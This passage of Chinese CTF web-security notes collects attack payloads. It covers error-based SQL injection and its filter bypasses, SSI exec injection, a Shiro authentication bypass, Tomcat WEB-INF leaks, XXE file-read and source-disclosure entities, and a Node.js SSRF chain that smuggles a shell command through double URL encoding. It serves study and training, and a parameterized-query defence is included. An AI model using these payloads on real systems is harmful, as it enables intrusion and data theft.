- 可以将其中user(), database(), version()等替换为select语句

```bash
# updatexml获取
1' or (updatexml(1, concat(0x7e, database(), 0x7e), 1)) # 

# extractvalue 从 XML 数据中提取值 
xxx and (extractvalue(1, concat(0x7e, user(), 0x7e))); # 
```

**后续获取**

```sql
# 表名
1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#

# 字段名
1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('table_name')),0x7e),1))#
```

**字符限制绕过**

- right获取后半部分内容

```sql
1'or(updatexml(1,concat(0x7e,(select(group_concat((right(ziduan_name,25))))from(table_name)),0x7e),1))#
1'^extractvalue(1,right(concat(0x7e,(select(group_concat(ziduan_name))from(table_name))),30))#
```

#### 绕过

**关键字绕过**

将`or`, `select`, `union`, `where`, `and`, `from`进行屏蔽

`str_replace`函数屏蔽将目标字符串只过滤一次，可以通过双写绕过：`uunionnion, sselectelect, oorr`

**编码预处理绕过**

- select被过滤，将SQL语句16进制编码：`select * from a` ==> `123`
- prepare from预处理进行编码转换，execute执行prepare创建的SQL语句，SET一次只能赋一个值

```sql
SET@a=0x123;prepare execsql from @a;execute execsql; # payload
```

**Handler**

```sql
handler table_name open as `a`; handler `a` read next; # 文件操作读取
HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;
```

**空格绕过**

```php
# 使用()绕过, 或直接不输入空格
1' or 
1'(or)

select(group_concat(column_name))from(information_schema.columns)where(table_name)like('xxx'))
```

**等号绕过**

```php
# 使用 like 绕过 =, 万能密码修改
1'or((1)like(1))# 
```

**or绕过**

使用`^`可绕过



### SSI注入漏洞

- Server-Side Includes Injection，服务端包含注入，SSI赋予html静态页面动态效果
- 存在`.shtml, .stm, .shtm`网页上某部分变量可控，如下，通过远程命令注入动态回显

```html
<div>{$what}</div>
<p>{{username}}</p>
<div>{%$a%}</div>
```

**利用命令格式**

```js
<!--#exec cmd="command"-->
```



## JAVA

### Shiro漏洞

#### 身份验证绕过

Apache Shiro < 1.5.3

- Shiro 特征：响应数据包中`Set-Cookie: rememberMe=deleteMe;`
- 直接访问` /shiro/admin/page` 返回302跳转要求登录
- 访问 `/;/shiro/admin/page` 能绕过Shiro权限验证访问到/admin路由信息



### 文件泄露

- 存在文件下载

tomcat敏感文件

- `/WEB-INF/web.xml`：Web配置文件，servlet及其他应用组件配置、命名规则
- `/WEB-INF/classes/`：包含所有 Servlet 类及其他类文件
- `/WEB-INF/lib/`：存放 web 应用所需各种 JAR 文件
- `/WEB-INF/src/`：源码目录
- `/WEB-INF/database.properties`：数据库配置文件

**web.xml查看**

```xml
<servlet>
<servlet-name>FlagController</servlet-name>
<servlet-class>com.wm.ctf.FlagController</servlet-class>
</servlet>
```

**读取对应文件**：`WEB-INF/classes/com/wm/ctf/FlagController.class`



### SQL注入

漏洞点：字符串拼接

```java
if (!StringUtils.isNullOrEmpty(userName)) {
	sql.append(" and u.userName like '%").append(userName).append("%'");// 模糊查询: % 匹配任意长度的字符
}
```

**前后闭合**

```java
// %25 为 %, 此处需要用%25, % 会报错
name%25' union select 1,2,version(),4,5,6,database(),8,9,10,11,12,13,14 where '1' like '%251
// 大于14不返回结果可判断回显列数
```

**PrepareStatement**

JAVA SQL API中用于执行参数化查询的接口，可防止SQL注入，SQL语句**提前编译**，参数作为数据处理而非直接拼接

```java
// 查询公共类
public static ResultSet execute(Connection connection, PreparedStatement preparedStatement, ResultSet resultSet, String sql, Object[] params) throws SQLException {
    // 获取预编译的SQL语句
    preparedStatement = connection.prepareStatement(sql);
    // 将占位符 ? 赋值
    for (int i = 0; i < params.length; i++) {
        preparedStatement.setObject(i + 1, params[i]);
    }
	// 执行查询
    resultSet = preparedStatement.executeQuery();
    return resultSet;
}
```

使用

```java
String sql = "SELECT * FROM users WHERE username = ? AND age = ?";
Object[] params = { "Alice", 25 };
ResultSet resultSet = execute(connection, null, null, sql, params);
```

### 反序列化漏洞



## JS

### 文件上传

**前端js过滤绕过**

```javascript
var file = document.getElementsByName('upload_file')[0].value;
var allow_ext = ".jpg|.png|.gif";
var ext_name = file.substring(file.lastIndexOf(".")); // 上传文件类型

if (allow_ext.indexOf(ext_name) == -1) {
    var errMsg = "NO";
    alert(errMsg);
    return false;
}
```

一句话木马命名后缀为jpg，后借助burpsuite拦截请求将名称改回

### XXE注入漏洞

- XML用于数据传输

**XML**

```xml
<!-- 一般实体 -->
<!ENTITY name "content"> <!-- 声明 -->
&name <!-- 引用 -->

<!-- 参数实体 -->
<!ENTITY % name "content"> <!-- 声明 -->
&name <!-- 引用 -->

<!-- 内部实体 -->
<!DOCTYPE test [<!ENTITY f "upfine">]> <!-- 声明 -->
&f <!-- 引用 -->

<!-- 外部实体 -->
<!DOCTYPE test [<!ENTITY f SYSTEM "file:///flag">]> <!-- 声明 -->
&f <!-- 引用 -->
```

- DTD：用于XML文档格式规范，可内部外部引入`<!DOCTYPE ... `
- 外部实体支持协议：`php(file, php, http, ftp), java(http, ftp, https)`
- XML外部实体注入，XML External Entity Injection，解析XML输入未禁止外部实体加载

抓包POST数据以XML形式传输

```xml
<user><username>input_thing</username></user>
```

**注入**

- 声明XML文档版本及编码，可选

```xml
<?xml version="1.0" encoding = "utf-8"?> 
<!DOCTYPE test [
<!ENTITY file SYSTEM  "file:///flag">
]>
<user>
	<username>&file;</username>
</user>
```

**使用协议获取源码**

```xml
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/xxx.php">
<!-- 获取内容base64解码 -->
```

**探测内网**

- 可通过`/proc/net/fib_trie, /proc/net/arp, /etc/hosts`获取可疑内网IP

```xml
<!ENTITY file SYSTEM "http://x.x.x.x/"> <!-- 通过此访问内网主机数据 -->
```



## Node.js

### 基础知识



### SSRF漏洞

#### 漏洞点

- 设置服务器端口

```js
var port = normalizePort(process.env.PORT || '3000');
```

- 此处通过post传入payload再通过get本地服务器访问达成SSRF利用

```js
// routes/index.js
var blacklist=['::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];

// req中ip:客户端IP地址, url:请求URL, query:GET查询参数, body:POST请求体数据
router.get('/debug', function(req, res, next) { // 请求对象, 响应对象, 下一步中间件
    if(blacklist.indexOf(req.ip)!=-1){ // 黑名单过滤
        var u=req.query.url.replace(/[\"\']/ig,''); // 清除请求url的单双引号
        
        let log=`echo '${url.parse(u).href}'>>/tmp/log`;
        child_process.exec(log); // 执行命令
        res.json({data:fs.readFileSync('/tmp/log').toString()}); // 读取内容返回
    }else{
        res.json({});
    }
});

router.post('/debug', function(req, res, next) {
    if(req.body.url !== undefined) {
        var u = req.body.url;
        var urlObject=url.parse(u); // 解析返回json对象
        if(blacklist.indexOf(urlObject.hostname) == -1){
            var dest=urlObject.href;
            request(dest,(err,result,body)=>{
                res.json(body);
            })
        }
        else{
            res.json([]);
        }
    }
});

```

**构造payload**

- 进制转换绕过黑名单
- 闭合引号加入其余命令：利用nodejs的url库二次解码绕过
  - `@`字符前，即表示用户名密码字段，会被二次解码
- `%00`或`%23`截断后续代码

```bash
# 二次编码 => web服务器一次解码 http://a%27@a, nodejs二次解码 http://a'@a
{"url":"http://0177.0.0.1:3000/debug?url=http://a%2527@a;cp$IFS/flag$IFS/tmp/log%00"}

# 特殊编码 => %EF%BC%87解码为'
{"url":"http://127.1:3000/debug?url=http://%EF%BC%87;cp$IFS/flag$IFS/tmp/log%00"}
```

使用POSTMAN，`POST -> body -> x-www-form-urlencoded`

#### 绕过

**SSRF黑名单绕过**

- `http://localhost`
- `http://[::]:80/`
- 进制转换`http://0177.0.0.1/`或`http://2130706433/`

